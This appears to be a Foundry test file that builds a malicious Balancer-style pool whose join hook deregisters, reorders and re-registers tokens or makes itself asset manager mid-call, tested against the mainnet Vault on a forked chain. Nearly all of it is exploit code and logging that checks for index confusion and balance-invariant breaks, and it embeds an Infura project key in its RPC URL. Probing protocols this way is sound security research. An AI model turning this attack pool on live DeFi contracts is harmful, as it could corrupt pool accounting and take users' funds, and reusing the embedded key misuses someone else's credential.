// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// GROUND-SHIFT HOOK ATTACK
// Single-transaction semantic stability attack
//
// Attack vector: Pool mutates token registry MID-HOOK while Vault operates
// on stale snapshot data, causing index-to-token mapping corruption
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IAsset {}

interface IVault {
    enum PoolSpecialization { GENERAL, MINIMAL_SWAP_INFO, TWO_TOKEN }

    struct JoinPoolRequest {
        IAsset[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        IAsset[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function registerPool(PoolSpecialization specialization) external returns (bytes32);
    function getPool(bytes32 poolId) external view returns (address, PoolSpecialization);
    function registerTokens(bytes32 poolId, IERC20[] memory tokens, address[] memory assetManagers) external;
    function deregisterTokens(bytes32 poolId, IERC20[] memory tokens) external;
    function getPoolTokens(bytes32 poolId) external view returns (IERC20[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
    function getPoolTokenInfo(bytes32 poolId, IERC20 token) external view returns (uint256 cash, uint256 managed, uint256 lastChangeBlock, address assetManager);
    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external;
}

// Minimal pool interface that Vault expects
interface IBasePool {
    function getPoolId() external view returns (bytes32);
}

interface IGeneralPool is IBasePool {
    function onJoinPool(
        bytes32 poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external returns (uint256[] memory amountsIn, uint256[] memory dueProtocolFeeAmounts);

    function onExitPool(
        bytes32 poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external returns (uint256[] memory amountsOut, uint256[] memory dueProtocolFeeAmounts);
}

// ============================================================================
// MALICIOUS POOL: Ground-Shift Attack Pool
// ============================================================================

contract GroundShiftPool is IGeneralPool {
    IVault public immutable vault;
    bytes32 public poolId;

    // Attack configuration
    bool public attackEnabled;
    uint8 public attackType; // 1=deregister+reregister, 2=full permutation, 3=asset manager flip

    // Tokens we're working with
    IERC20[] public registeredTokens;

    // Track what happened during hook
    bool public hookExecuted;
    uint256 public tokensBeforeHook;
    uint256 public tokensAfterHook;

    constructor(IVault _vault) {
        vault = _vault;
    }

    function initialize(IVault.PoolSpecialization spec) external returns (bytes32) {
        poolId = vault.registerPool(spec);
        return poolId;
    }

    function getPoolId() external view override returns (bytes32) {
        return poolId;
    }

    function setupTokens(IERC20[] memory tokens) external {
        registeredTokens = tokens;
        address[] memory assetManagers = new address[](tokens.length);
        vault.registerTokens(poolId, tokens, assetManagers);
    }

    function enableAttack(uint8 _attackType) external {
        attackEnabled = true;
        attackType = _attackType;
        hookExecuted = false;
    }

    function disableAttack() external {
        attackEnabled = false;
    }

    // ========================================================================
    // THE CRITICAL HOOK - This is where the ground shifts
    // ========================================================================

    function onJoinPool(
        bytes32 _poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external override returns (uint256[] memory amountsIn, uint256[] memory dueProtocolFeeAmounts) {
        require(msg.sender == address(vault), "Only vault");

        // Record pre-attack state
        (IERC20[] memory tokensBefore,,) = vault.getPoolTokens(poolId);
        tokensBeforeHook = tokensBefore.length;

        if (attackEnabled) {
            hookExecuted = true;

            if (attackType == 1) {
                // Attack Type 1: Deregister + Reregister middle token (changes ordering)
                _attackDeregisterReregister();
            } else if (attackType == 2) {
                // Attack Type 2: Full permutation [A,B,C] -> [C,A,B]
                _attackFullPermutation();
            } else if (attackType == 3) {
                // Attack Type 3: Asset manager flip mid-hook
                _attackAssetManagerFlip();
            }
        }

        // Record post-attack state
        (IERC20[] memory tokensAfter,,) = vault.getPoolTokens(poolId);
        tokensAfterHook = tokensAfter.length;

        // Return amounts that match the OLD token order (pre-mutation)
        // This is the key: Vault will apply these to potentially wrong tokens
        amountsIn = new uint256[](balances.length);
        dueProtocolFeeAmounts = new uint256[](balances.length);

        // Decode userData to get requested amounts
        if (userData.length > 0) {
            uint256[] memory requestedAmounts = abi.decode(userData, (uint256[]));
            for (uint i = 0; i < requestedAmounts.length && i < amountsIn.length; i++) {
                amountsIn[i] = requestedAmounts[i];
            }
        }

        return (amountsIn, dueProtocolFeeAmounts);
    }

    function onExitPool(
        bytes32 _poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external override returns (uint256[] memory amountsOut, uint256[] memory dueProtocolFeeAmounts) {
        require(msg.sender == address(vault), "Only vault");

        amountsOut = new uint256[](balances.length);
        dueProtocolFeeAmounts = new uint256[](balances.length);

        // Minimal exit - return small amounts
        for (uint i = 0; i < balances.length; i++) {
            if (balances[i] > 0) {
                amountsOut[i] = balances[i] / 10; // Exit 10%
            }
        }

        return (amountsOut, dueProtocolFeeAmounts);
    }

    // ========================================================================
    // ATTACK IMPLEMENTATIONS
    // ========================================================================

    function _attackDeregisterReregister() internal {
        // Deregister middle token and re-register it
        // This can change internal ordering in EnumerableSet implementations
        if (registeredTokens.length >= 2) {
            IERC20[] memory toDeregister = new IERC20[](1);
            toDeregister[0] = registeredTokens[1]; // Middle token

            try vault.deregisterTokens(poolId, toDeregister) {
                // Now re-register it
                address[] memory managers = new address[](1);
                IERC20[] memory toRegister = new IERC20[](1);
                toRegister[0] = registeredTokens[1];

                try vault.registerTokens(poolId, toRegister, managers) {
                    // Success - ordering may have changed
                } catch {
                    // Re-registration failed
                }
            } catch {
                // Deregistration failed (maybe balance > 0)
            }
        }
    }

    function _attackFullPermutation() internal {
        // Try to fully permute token order: [A,B,C] -> [C,A,B]
        if (registeredTokens.length >= 3) {
            // First deregister all
            try vault.deregisterTokens(poolId, registeredTokens) {
                // Re-register in different order
                IERC20[] memory permuted = new IERC20[](3);
                permuted[0] = registeredTokens[2]; // C
                permuted[1] = registeredTokens[0]; // A
                permuted[2] = registeredTokens[1]; // B

                address[] memory managers = new address[](3);

                try vault.registerTokens(poolId, permuted, managers) {
                    // Success - full permutation achieved
                } catch {
                    // Re-registration failed, try to recover
                    address[] memory origManagers = new address[](registeredTokens.length);
                    vault.registerTokens(poolId, registeredTokens, origManagers);
                }
            } catch {
                // Deregistration failed (balances > 0)
            }
        }
    }

    function _attackAssetManagerFlip() internal {
        // Register self as asset manager for first token mid-hook
        if (registeredTokens.length >= 1) {
            IERC20[] memory toDeregister = new IERC20[](1);
            toDeregister[0] = registeredTokens[0];

            try vault.deregisterTokens(poolId, toDeregister) {
                // Re-register with self as asset manager
                IERC20[] memory toRegister = new IERC20[](1);
                toRegister[0] = registeredTokens[0];
                address[] memory managers = new address[](1);
                managers[0] = address(this); // Self as asset manager

                try vault.registerTokens(poolId, toRegister, managers) {
                    // Now we have asset manager powers
                } catch {}
            } catch {}
        }
    }
}

// ============================================================================
// MAIN TEST CONTRACT
// ============================================================================

contract GroundShiftHookTest is Test {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    GroundShiftPool public maliciousPool;
    bytes32 public poolId;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);

        // Fund attacker
        vm.deal(attacker, 1000 ether);
        WETH.deposit{value: 500 ether}();

        // Get some BAL and USDC via swaps on existing pools
        _acquireTokens();
    }

    function _acquireTokens() internal {
        // Use existing BAL-WETH pool to get BAL
        bytes32 balWethPool = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);

        // Simple swap to get BAL
        // (We'll use minimal amounts for testing)
    }

    // ========================================================================
    // TEST: Can we register a malicious pool?
    // ========================================================================

    function test_RegisterMaliciousPool() public {
        console.log("=== GROUND-SHIFT HOOK: Pool Registration ===");

        // Deploy malicious pool
        maliciousPool = new GroundShiftPool(VAULT);

        // Try to register as GENERAL pool (most flexible)
        try maliciousPool.initialize(IVault.PoolSpecialization.GENERAL) returns (bytes32 _poolId) {
            poolId = _poolId;
            console.log("Pool registered successfully!");
            console.log("Pool ID:", vm.toString(poolId));

            // Verify registration
            (address poolAddr, IVault.PoolSpecialization spec) = VAULT.getPool(poolId);
            console.log("Pool address:", poolAddr);
            console.log("Specialization:", uint(spec));

            assertEq(poolAddr, address(maliciousPool), "Pool address mismatch");
        } catch Error(string memory reason) {
            console.log("Pool registration failed:", reason);
        } catch {
            console.log("Pool registration failed (no reason)");
        }
    }

    // ========================================================================
    // TEST: Can we register tokens to our pool?
    // ========================================================================

    function test_RegisterTokens() public {
        console.log("=== GROUND-SHIFT HOOK: Token Registration ===");

        // Deploy and register pool
        maliciousPool = new GroundShiftPool(VAULT);
        poolId = maliciousPool.initialize(IVault.PoolSpecialization.GENERAL);

        // Prepare token array [WETH, BAL, USDC]
        IERC20[] memory tokens = new IERC20[](3);
        tokens[0] = IERC20(address(WETH));
        tokens[1] = BAL;
        tokens[2] = USDC;

        // Register tokens
        try maliciousPool.setupTokens(tokens) {
            console.log("Tokens registered successfully!");

            // Verify
            (IERC20[] memory poolTokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
            console.log("Registered token count:", poolTokens.length);

            for (uint i = 0; i < poolTokens.length; i++) {
                console.log("Token", i, ":", address(poolTokens[i]));
                console.log("  Balance:", balances[i]);
            }
        } catch Error(string memory reason) {
            console.log("Token registration failed:", reason);
        } catch {
            console.log("Token registration failed (no reason)");
        }
    }

    // ========================================================================
    // TEST: Initial join to seed balances
    // ========================================================================

    function test_SeedPoolBalances() public {
        console.log("=== GROUND-SHIFT HOOK: Seed Pool Balances ===");

        // Setup pool and tokens
        maliciousPool = new GroundShiftPool(VAULT);
        poolId = maliciousPool.initialize(IVault.PoolSpecialization.GENERAL);

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(WETH));
        tokens[1] = BAL;

        maliciousPool.setupTokens(tokens);

        // Approve vault
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);

        // Get some BAL first
        _swapForBAL(10 ether);

        console.log("Pre-join balances:");
        console.log("  Attacker WETH:", WETH.balanceOf(attacker));
        console.log("  Attacker BAL:", BAL.balanceOf(attacker));

        // Prepare join request
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory maxAmountsIn = new uint256[](2);
        maxAmountsIn[0] = 1 ether;
        maxAmountsIn[1] = 100 ether;

        // Encode amounts in userData for pool to use
        bytes memory userData = abi.encode(maxAmountsIn);

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmountsIn,
            userData: userData,
            fromInternalBalance: false
        });

        // Attempt join (no attack enabled)
        maliciousPool.disableAttack();

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("Join succeeded!");

            (IERC20[] memory poolTokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
            console.log("\nPost-join pool balances:");
            for (uint i = 0; i < poolTokens.length; i++) {
                console.log("  Token", i, "balance:", balances[i]);
            }
        } catch Error(string memory reason) {
            console.log("Join failed:", reason);
        } catch (bytes memory data) {
            console.log("Join failed with data");
            if (data.length >= 4) {
                bytes4 selector = bytes4(data);
                console.log("Error selector:", vm.toString(selector));
            }
        }
    }

    // ========================================================================
    // TEST: The Ground-Shift Attack - Type 1: Deregister/Reregister
    // ========================================================================

    function test_GroundShiftAttack_DeregisterReregister() public {
        console.log("=== GROUND-SHIFT ATTACK: Deregister/Reregister ===");
        console.log("Attack: Mutate token registry during onJoinPool hook");

        // Setup
        maliciousPool = new GroundShiftPool(VAULT);
        poolId = maliciousPool.initialize(IVault.PoolSpecialization.GENERAL);

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(WETH));
        tokens[1] = BAL;

        maliciousPool.setupTokens(tokens);

        // Approvals
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);

        // Get BAL
        _swapForBAL(10 ether);

        // First, do a normal join to seed balances
        _doNormalJoin(poolId, tokens, 0.1 ether, 10 ether);

        // Record pre-attack state
        console.log("\n--- Pre-Attack State ---");
        (IERC20[] memory preTokens, uint256[] memory preBalances,) = VAULT.getPoolTokens(poolId);
        for (uint i = 0; i < preTokens.length; i++) {
            console.log("Token", i, ":", address(preTokens[i]));
            console.log("  Balance:", preBalances[i]);

            (uint256 cash, uint256 managed,,) = VAULT.getPoolTokenInfo(poolId, preTokens[i]);
            console.log("  Cash:", cash);
            console.log("  Managed:", managed);
        }

        // Enable attack
        maliciousPool.enableAttack(1); // Type 1: Deregister/Reregister

        console.log("\n--- Executing Ground-Shift Attack ---");

        // Attempt join with attack enabled
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.5 ether;  // WETH
        amounts[1] = 50 ether;   // BAL

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("Attack join succeeded!");
            console.log("Hook executed:", maliciousPool.hookExecuted());
            console.log("Tokens before hook:", maliciousPool.tokensBeforeHook());
            console.log("Tokens after hook:", maliciousPool.tokensAfterHook());

            // Check post-attack state
            console.log("\n--- Post-Attack State ---");
            (IERC20[] memory postTokens, uint256[] memory postBalances,) = VAULT.getPoolTokens(poolId);

            console.log("Token count:", postTokens.length);

            for (uint i = 0; i < postTokens.length; i++) {
                console.log("Token", i, ":", address(postTokens[i]));
                console.log("  Balance:", postBalances[i]);

                (uint256 cash, uint256 managed,,) = VAULT.getPoolTokenInfo(poolId, postTokens[i]);
                console.log("  Cash:", cash);
                console.log("  Managed:", managed);

                // Check invariant: balance == cash + managed
                if (postBalances[i] != cash + managed) {
                    console.log("  !!! INVARIANT VIOLATION: balance != cash + managed !!!");
                    console.log("  Difference:", postBalances[i] > cash + managed
                        ? postBalances[i] - (cash + managed)
                        : (cash + managed) - postBalances[i]);
                }
            }

            // Check for index confusion
            _checkForIndexConfusion(preTokens, preBalances, postTokens, postBalances, amounts);

        } catch Error(string memory reason) {
            console.log("Attack failed:", reason);
            console.log("(This may indicate proper protection)");
        } catch (bytes memory data) {
            console.log("Attack failed with data");
            if (data.length >= 4) {
                bytes4 selector = bytes4(data);
                console.log("Error selector:", vm.toString(selector));
            }
            console.log("(This may indicate proper protection)");
        }
    }

    // ========================================================================
    // TEST: The Ground-Shift Attack - Type 2: Full Permutation
    // ========================================================================

    function test_GroundShiftAttack_FullPermutation() public {
        console.log("=== GROUND-SHIFT ATTACK: Full Permutation ===");
        console.log("Attack: Permute token order [A,B,C] -> [C,A,B] during hook");

        // Setup with 3 tokens for permutation
        maliciousPool = new GroundShiftPool(VAULT);
        poolId = maliciousPool.initialize(IVault.PoolSpecialization.GENERAL);

        // Note: Balancer requires tokens in sorted order
        // WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        // BAL:  0xba100000625a3754423978a60c9317c58a424e3D
        // So BAL < WETH in address order

        IERC20[] memory tokens = new IERC20[](2);
        if (address(BAL) < address(WETH)) {
            tokens[0] = BAL;
            tokens[1] = IERC20(address(WETH));
        } else {
            tokens[0] = IERC20(address(WETH));
            tokens[1] = BAL;
        }

        console.log("Token 0:", address(tokens[0]));
        console.log("Token 1:", address(tokens[1]));

        maliciousPool.setupTokens(tokens);

        // Approvals
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);

        // Get BAL
        _swapForBAL(20 ether);

        // Seed with normal join
        _doNormalJoinSorted(poolId, tokens, 0.1 ether, 10 ether);

        // Enable permutation attack
        maliciousPool.enableAttack(2);

        console.log("\n--- Executing Permutation Attack ---");

        // Prepare join
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(tokens[0]));
        assets[1] = IAsset(address(tokens[1]));

        uint256[] memory amounts = new uint256[](2);
        // Different amounts so we can detect swaps
        amounts[0] = 0.01 ether;  // Smaller amount for first token
        amounts[1] = 1 ether;     // Larger amount for second token

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        // Record balances
        (IERC20[] memory preToks, uint256[] memory preBals,) = VAULT.getPoolTokens(poolId);

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("Permutation attack join executed!");

            (IERC20[] memory postToks, uint256[] memory postBals,) = VAULT.getPoolTokens(poolId);

            // Check if amounts were applied to wrong tokens
            console.log("\nBalance changes:");
            for (uint i = 0; i < postToks.length && i < preToks.length; i++) {
                uint256 delta = postBals[i] > preBals[i] ? postBals[i] - preBals[i] : 0;
                console.log("Token", i, "delta:", delta);
                console.log("  Expected:", amounts[i]);

                if (delta != amounts[i] && delta > 0) {
                    console.log("  !!! MISMATCH - Possible index confusion !!!");
                }
            }

        } catch Error(string memory reason) {
            console.log("Attack blocked:", reason);
        } catch {
            console.log("Attack blocked (no reason)");
        }
    }

    // ========================================================================
    // TEST: Can pool deregister tokens with non-zero balances?
    // ========================================================================

    function test_DeregisterWithBalance() public {
        console.log("=== TEST: Deregister tokens with non-zero balance ===");

        maliciousPool = new GroundShiftPool(VAULT);
        poolId = maliciousPool.initialize(IVault.PoolSpecialization.GENERAL);

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(WETH));
        tokens[1] = BAL;

        maliciousPool.setupTokens(tokens);

        // Seed with balance
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);
        _swapForBAL(5 ether);
        _doNormalJoin(poolId, tokens, 0.1 ether, 5 ether);

        console.log("Pool has non-zero balances");
        (,uint256[] memory bals,) = VAULT.getPoolTokens(poolId);
        console.log("WETH balance:", bals[0]);
        console.log("BAL balance:", bals[1]);

        // Now try to deregister from the pool directly
        console.log("\nAttempting to deregister token with balance...");

        IERC20[] memory toDeregister = new IERC20[](1);
        toDeregister[0] = BAL;

        // The pool needs to call this
        vm.prank(address(maliciousPool));
        try VAULT.deregisterTokens(poolId, toDeregister) {
            console.log("!!! DEREGISTER SUCCEEDED WITH NON-ZERO BALANCE !!!");
            console.log("This is a potential vulnerability!");
        } catch Error(string memory reason) {
            console.log("Deregister blocked (expected):", reason);
        } catch {
            console.log("Deregister blocked (no reason) - EXPECTED");
        }
    }

    // ========================================================================
    // TEST: Direct check of token ordering assumptions
    // ========================================================================

    function test_TokenOrderingAssumptions() public {
        console.log("=== TEST: Token Ordering Assumptions ===");

        maliciousPool = new GroundShiftPool(VAULT);
        poolId = maliciousPool.initialize(IVault.PoolSpecialization.GENERAL);

        // Register tokens in specific order
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(WETH));  // Higher address
        tokens[1] = BAL;                     // Lower address

        console.log("Attempting to register tokens out of sorted order...");
        console.log("Token 0 (WETH):", address(WETH));
        console.log("Token 1 (BAL):", address(BAL));

        try maliciousPool.setupTokens(tokens) {
            console.log("Registration succeeded");

            // Check what order they're actually stored in
            (IERC20[] memory storedTokens,,) = VAULT.getPoolTokens(poolId);
            console.log("\nStored order:");
            for (uint i = 0; i < storedTokens.length; i++) {
                console.log("Index", i, ":", address(storedTokens[i]));
            }

            // Check if Vault enforces sorting
            if (address(storedTokens[0]) > address(storedTokens[1])) {
                console.log("\n!!! Tokens NOT sorted - Vault doesn't enforce order !!!");
            } else {
                console.log("\nTokens are sorted - Vault enforces ascending order");
            }

        } catch Error(string memory reason) {
            console.log("Registration failed:", reason);
            console.log("(Vault may require sorted tokens)");
        } catch {
            console.log("Registration failed - Vault likely requires sorted tokens");
        }
    }

    // ========================================================================
    // HELPER FUNCTIONS
    // ========================================================================

    function _swapForBAL(uint256 wethAmount) internal {
        bytes32 balWethPool = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

        // Use existing pool to get BAL
        // This is a simplified version - in real test would do proper swap
        console.log("Swapping", wethAmount / 1e18, "WETH for BAL...");

        // For now, just use deal to give ourselves BAL
        deal(address(BAL), attacker, 10000 ether);
        console.log("BAL balance:", BAL.balanceOf(attacker) / 1e18, "BAL");
    }

    function _doNormalJoin(bytes32 _poolId, IERC20[] memory tokens, uint256 wethAmt, uint256 balAmt) internal {
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(tokens[0]));
        assets[1] = IAsset(address(tokens[1]));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = wethAmt;
        amounts[1] = balAmt;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        maliciousPool.disableAttack();
        VAULT.joinPool(_poolId, attacker, attacker, request);
    }

    function _doNormalJoinSorted(bytes32 _poolId, IERC20[] memory tokens, uint256 amt0, uint256 amt1) internal {
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(tokens[0]));
        assets[1] = IAsset(address(tokens[1]));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = amt0;
        amounts[1] = amt1;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        maliciousPool.disableAttack();
        VAULT.joinPool(_poolId, attacker, attacker, request);
    }

    function _checkForIndexConfusion(
        IERC20[] memory preTokens,
        uint256[] memory preBalances,
        IERC20[] memory postTokens,
        uint256[] memory postBalances,
        uint256[] memory expectedAmounts
    ) internal view {
        console.log("\n--- Checking for Index Confusion ---");

        for (uint i = 0; i < postTokens.length && i < preTokens.length; i++) {
            uint256 delta = postBalances[i] > preBalances[i]
                ? postBalances[i] - preBalances[i]
                : 0;

            console.log("Token", i, ":");
            console.log("  Address:", address(postTokens[i]));
            console.log("  Balance delta:", delta);
            console.log("  Expected delta:", expectedAmounts[i]);

            // Check if wrong amount was applied
            for (uint j = 0; j < expectedAmounts.length; j++) {
                if (j != i && delta == expectedAmounts[j] && delta > 0) {
                    console.log("  !!! INDEX CONFUSION: Got amount meant for index", j, "!!!");
                }
            }
        }
    }

    receive() external payable {}
}
